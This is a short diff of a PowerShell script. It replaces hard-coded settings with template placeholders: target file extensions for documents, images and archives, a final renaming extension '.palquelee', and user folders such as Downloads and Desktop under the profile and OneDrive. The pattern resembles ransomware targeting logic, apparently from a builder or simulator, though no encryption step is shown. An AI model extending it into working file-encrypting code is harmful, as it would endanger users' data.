@@ -1,6 +1,7 @@
-$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
-$final_ext = ".palquelee"
-$user_dirs = "(Downloads|Desktop|Documents)";
+$ext = {{LISTADO_EXTENSIONES}}
+$final_ext = "{{EXTENSION_FINAL}}"
+$user_dirs = "{{DIRECTORIOS}}";
+
 $base_dirs = @("$Env:USERPROFILE", "$Env:OneDrive");
 foreach($base in $base_dirs){
     if([string]::IsNullOrEmpty($base)){continue}
